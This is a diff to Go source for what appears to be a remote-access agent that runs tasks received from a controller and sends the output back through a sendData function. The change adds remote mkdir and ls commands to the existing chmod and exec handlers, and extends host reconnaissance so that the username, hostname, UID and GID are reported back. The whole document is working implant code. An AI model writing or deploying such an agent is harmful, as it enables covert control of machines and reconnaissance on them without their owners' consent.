@@ -13,6 +13,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/jasonlvhit/gocron"
 )
@@ -108,6 +109,14 @@ func processTask(task string) {
 		sendData(string(wd))
 	} else if strings.HasPrefix(task, "chmod") {
 		changePerms(strings.Fields(task)[1:])
+	} else if strings.HasPrefix(task, "mkdir") {
+		mkdir(strings.Fields(task)[1:])
+	} else if strings.HasPrefix(task, "ls") {
+		if len(strings.Fields(task)) == 1 {
+			ls(".")
+		} else {
+			ls(strings.Fields(task)[1])
+		}
 	} else if strings.HasPrefix(task, "exec") {
 		if len(strings.Fields(task)) < 2 {
 			return
@@ -129,10 +138,13 @@ func sendData(output string) {
 }
 
 func getUID(id string) {
+	var output string
 	hostname, _ = os.Hostname()
 	test, _ := user.Current()
 	username = test.Username
-	output := username + "@" + hostname
+	uid := fmt.Sprint(os.Getuid())
+	gid := fmt.Sprint(os.Getgid())
+	output = username + "@" + hostname + " UID=" + uid + " GID=" + gid
 	sendData(output)
 }
 
@@ -220,4 +232,36 @@ func changePerms(args []string) {
 	}
 	output := "Done!"
 	sendData(output)
+}
+
+func mkdir(names []string) {
+	var output string
+	for _, name := range names {
+		err := os.Mkdir(name, 0755)
+		if err != nil {
+			continue
+		}
+	}
+	output = "Done!"
+	sendData(output)
+}
+
+func ls(path string) {
+	var output string
+	files, err := os.ReadDir(path)
+	if err != nil {
+		output = "There was an error"
+		sendData(output)
+		return
+	}
+
+	b := new(bytes.Buffer)
+	for _, file := range files {
+		info, err := file.Info()
+		if err != nil {
+			continue
+		}
+		fmt.Fprintf(b, "%s %d\t%s\t%s\n", info.Mode(), info.Size(), info.ModTime().Format(time.UnixDate), file.Name())
+	}
+	sendData(b.String())
 }
